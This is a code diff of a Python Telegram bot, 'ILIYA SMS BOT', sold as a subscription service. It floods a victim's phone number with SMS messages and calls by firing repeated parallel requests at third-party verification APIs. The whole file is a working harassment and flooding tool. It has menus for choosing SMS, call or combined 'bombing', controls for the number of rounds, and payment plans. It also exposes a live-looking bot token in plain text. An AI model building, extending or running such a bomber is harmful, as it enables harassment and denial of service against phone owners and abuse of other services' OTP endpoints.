@@ -1,20 +1,17 @@
 import asyncio
 import concurrent.futures
-import time as time_module
+import threading
 from datetime import datetime, timedelta
 import requests
+from http.server import HTTPServer, BaseHTTPRequestHandler
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters
 
-TOKEN = "8224604758:AAEzJVoRtNQP3qX_zHUmOOGvx-XnIzjiOhg"  # از @BotFather بگیر
-ADMIN_ID = 2025464333  # آیدی عددی خودت
+TOKEN = "8224604758:AAEzJVoRtNQP3qX_zHUmOOGvx-XnIzjiOhg"  # az @BotFather begir
+ADMIN_ID = 2025464333  # id adadi khodet
 
-HDR = {
-    "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36",
-    "Content-Type": "application/json",
-}
-
-USERS = {}  # {user_id: {"expire": datetime, "active_bomb": bool, "stop": bool}}
+HDR = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
+USERS = {}
 
 def sms_apis(phone):
     return [
@@ -49,152 +46,135 @@ def call_apis(phone):
 def get_apis(phone, mode):
     if mode == "sms": return sms_apis(phone)
     elif mode == "call": return call_apis(phone)
-    else: return call_apis(phone) + sms_apis(phone)
+    return call_apis(phone) + sms_apis(phone)
 
-def send_one(api, user_id, total):
-    if USERS.get(user_id, {}).get("stop"):
-        return ("stop", api[0], 0)
+def send_one(api, uid):
+    if USERS.get(uid, {}).get("stop"): return ("stop", api[0])
     name, url, data = api
     try:
         r = requests.post(url, json=data, headers=HDR, timeout=8)
         if r.status_code in (200,201,202,204,400,401,403,422,429):
-            return ("ok", name, r.status_code)
-        return ("fail", name, r.status_code)
+            return ("ok", name)
+        return ("fail", name)
     except:
-        return ("err", name, 0)
+        return ("err", name)
 
-async def bomb_user(update, phone, rounds, mode, user_id):
-    USERS.setdefault(user_id, {})["stop"] = False
-    USERS[user_id]["active_bomb"] = True
+async def bomb(update, phone, rounds, mode, uid):
+    USERS.setdefault(uid, {})["stop"] = False
+    USERS[uid]["active"] = True
     apis = get_apis(phone, mode)
     total = len(apis) * rounds
     ok = fail = stop = 0
-    msg = await update.message.reply_text(f"Bombing started: {phone}\nMode: {mode}\nTotal: {total} APIs\n\n0/{total} OK")
-
+    msg = await update.message.reply_text(f"Bombing: {phone} | {mode}\n0/{total}")
     loop = asyncio.get_event_loop()
     for rnd in range(rounds):
-        if USERS.get(user_id, {}).get("stop"):
+        if USERS.get(uid, {}).get("stop"):
             stop += len(apis) * (rounds - rnd)
             break
         with concurrent.futures.ThreadPoolExecutor(max_workers=10) as ex:
-            futs = [loop.run_in_executor(ex, send_one, api, user_id, total) for api in apis]
-            for i, coro in enumerate(asyncio.as_completed(futs)):
+            futures = [loop.run_in_executor(ex, send_one, api, uid) for api in apis]
+            for coro in asyncio.as_completed(futures):
                 res = await coro
                 if res[0] == "ok": ok += 1
                 elif res[0] == "stop": stop += 1
                 else: fail += 1
                 if (ok+fail+stop) % 5 == 0:
-                    try:
-                        await msg.edit_text(f"Bombing: {phone}\nMode: {mode}\n\nOK: {ok} | FAIL: {fail} | STOP: {stop}\n{ok+fail+stop}/{total}")
+                    try: await msg.edit_text(f"Bombing: {phone} | {mode}\nOK:{ok} FAIL:{fail} STOP:{stop}\n{ok+fail+stop}/{total}")
                     except: pass
-        if rnd < rounds - 1 and not USERS.get(user_id, {}).get("stop"):
+        if rnd < rounds - 1 and not USERS.get(uid, {}).get("stop"):
             await asyncio.sleep(0.3)
-
-    USERS[user_id]["active_bomb"] = False
-    USERS[user_id]["stop"] = False
-    await msg.edit_text(f"Done! {phone}\nMode: {mode}\n\nOK: {ok} | FAIL: {fail} | STOP: {stop}")
-
-def glass_btn(text, callback):
-    return InlineKeyboardButton(text, callback_data=callback)
+    USERS[uid]["active"] = False
+    await msg.edit_text(f"Done! {phone}\nOK:{ok} FAIL:{fail} STOP:{stop}")
 
 def main_menu():
     return InlineKeyboardMarkup([
-        [glass_btn("💣 SMS Bomber", "mode_sms"),
-         glass_btn("📞 Call Bomber", "mode_call")],
-        [glass_btn("⚡ SMS + Call", "mode_all"),
-         glass_btn("⏹️ Stop", "stop_bomb")],
-        [glass_btn("🎟️ Free Test (1 Day)", "test_1day"),
-         glass_btn("💎 Buy Subscription", "buy_sub")],
-        [glass_btn("ℹ️ Help", "help")],
+        [InlineKeyboardButton("SMS Bomber", callback_data="sms"),
+         InlineKeyboardButton("Call Bomber", callback_data="call")],
+        [InlineKeyboardButton("SMS + Call", callback_data="all"),
+         InlineKeyboardButton("Stop", callback_data="stop")],
+        [InlineKeyboardButton("Free Test 1 Day", callback_data="test"),
+         InlineKeyboardButton("Buy Subscription", callback_data="buy")],
+        [InlineKeyboardButton("Help", callback_data="help")],
     ])
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text(
-        "╔══════════════════════╗\n"
-        "║    ILIYA SMS BOT    ║\n"
-        "║  SMS & CALL BOMBER  ║\n"
-        "╚══════════════════════╝\n\n"
-        "Select an option:",
-        reply_markup=main_menu()
-    )
+async def start(update, context):
+    await update.message.reply_text("ILIYA SMS BOT\nSMS & CALL BOMBER\n\nSelect:", reply_markup=main_menu())
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def button(update, context):
     q = update.callback_query
     await q.answer()
-    data = q.data
+    d = q.data
     uid = q.from_user.id
-
-    if data.startswith("mode_"):
-        mode = data.split("_")[1]
-        context.user_data["mode"] = mode
-        await q.message.reply_text(
-            f"Mode: {mode.upper()}\nSend phone number (0912xxxxxxx) and rounds (e.g. '09121234567 3'):"
-        )
-    elif data == "stop_bomb":
+    if d in ("sms","call","all"):
+        context.user_data["mode"] = d
+        await q.message.reply_text(f"Mode: {d.upper()}\nSend: PHONE ROUNDS\nExample: 09121234567 3")
+    elif d == "stop":
         USERS.setdefault(uid, {})["stop"] = True
-        await q.message.reply_text("Stopping current bomb...")
-    elif data == "test_1day":
-        USERS[uid] = {"expire": datetime.now() + timedelta(days=1), "active_bomb": False, "stop": False}
-        await q.message.reply_text("Free 1-day test activated! Use the menu to start bombing.")
-    elif data == "buy_sub":
-        await q.message.reply_text("💎 Subscription Plans:\n\n1 Month: 100 Toman\n3 Months: 250 Toman\n6 Months: 450 Toman\n\nContact @admin for purchase.")
-    elif data == "help":
-        await q.message.reply_text(
-            "How to use:\n"
-            "1. Choose mode (SMS/Call/Both)\n"
-            "2. Send: PHONE ROUNDS\n"
-            "   Example: 09121234567 5\n"
-            "3. Press Stop to cancel\n\n"
-            "Commands: /start /stop /test /buy /help"
-        )
+        await q.message.reply_text("Stopping...")
+    elif d == "test":
+        USERS[uid] = {"expire": datetime.now() + timedelta(days=1), "active": False, "stop": False}
+        await q.message.reply_text("1-day trial activated!")
+    elif d == "buy":
+        await q.message.reply_text("Plans: 1M=100T | 3M=250T | 6M=450T\nContact @admin")
+    elif d == "help":
+        await q.message.reply_text("1. Choose mode\n2. Send: PHONE ROUNDS\nExample: 09121234567 3\nCommands: /start /test /buy /help")
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def handle_msg(update, context):
     uid = update.effective_user.id
     text = update.message.text.strip()
-
-    if uid not in USERS or USERS[uid].get("expire", datetime.min) < datetime.now():
-        if uid != ADMIN_ID:
-            await update.message.reply_text("Subscription expired or not activated. Use /test for 1-day free trial or /buy to purchase.")
+    if uid != ADMIN_ID:
+        expire = USERS.get(uid, {}).get("expire", datetime.min)
+        if expire < datetime.now():
+            await update.message.reply_text("Expired! Use /test or /buy")
             return
-
     mode = context.user_data.get("mode", "all")
     parts = text.split()
-    if len(parts) >= 1 and parts[0].startswith("09"):
+    if parts and parts[0].startswith("09"):
         phone = parts[0]
         rounds = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 1
-        if USERS.get(uid, {}).get("active_bomb"):
-            await update.message.reply_text("A bomb is already running. Wait or press Stop.")
+        if USERS.get(uid, {}).get("active"):
+            await update.message.reply_text("Already running. Press Stop first.")
             return
-        await bomb_user(update, phone, rounds, mode, uid)
+        await bomb(update, phone, rounds, mode, uid)
     else:
-        await update.message.reply_text("Format: PHONE ROUNDS\nExample: 09121234567 3", reply_markup=main_menu())
+        await update.message.reply_text("Format: 09121234567 3")
 
-async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def stop_cmd(update, context):
     uid = update.effective_user.id
     USERS.setdefault(uid, {})["stop"] = True
-    await update.message.reply_text("Stop signal sent.")
+    await update.message.reply_text("Stop sent.")
 
-async def test_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+async def test_cmd(update, context):
     uid = update.effective_user.id
-    USERS[uid] = {"expire": datetime.now() + timedelta(days=1), "active_bomb": False, "stop": False}
-    await update.message.reply_text("1-day free trial activated!")
+    USERS[uid] = {"expire": datetime.now() + timedelta(days=1), "active": False, "stop": False}
+    await update.message.reply_text("1-day trial activated!")
 
-async def buy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("💎 Plans: 1M=100T | 3M=250T | 6M=450T\nContact @admin")
+async def buy_cmd(update, context):
+    await update.message.reply_text("Plans: 1M=100T | 3M=250T | 6M=450T\nContact @admin")
 
-async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Choose mode, then send PHONE ROUNDS.\nExample: 09121234567 3")
+async def help_cmd(update, context):
+    await update.message.reply_text("1. Choose mode\n2. Send: PHONE ROUNDS\n/start /test /buy /help")
+
+class HealthHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"OK")
+
+def run_health():
+    HTTPServer(("0.0.0.0", 10000), HealthHandler).serve_forever()
 
 def main():
+    threading.Thread(target=run_health, daemon=True).start()
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop_cmd))
     app.add_handler(CommandHandler("test", test_cmd))
     app.add_handler(CommandHandler("buy", buy_cmd))
     app.add_handler(CommandHandler("help", help_cmd))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-    print("Bot is running...")
+    app.add_handler(CallbackQueryHandler(button))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_msg))
+    print("Bot running...")
     app.run_polling()
 
 if __name__ == "__main__":
